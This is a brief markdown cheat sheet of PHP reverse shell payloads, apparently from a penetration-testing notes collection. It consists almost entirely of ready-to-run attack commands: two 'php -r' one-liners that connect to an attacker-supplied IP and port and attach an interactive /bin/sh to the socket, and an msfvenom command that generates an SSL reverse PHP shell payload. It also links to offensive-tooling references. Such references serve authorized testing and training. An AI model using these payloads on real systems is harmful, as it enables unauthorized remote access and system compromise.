# PHP

## 01 - One-liners

```php
$ php -r '$sock=fsockopen("<IP>", <PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

$ php -r '$sock=fsockopen("<IP>", <PORT>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)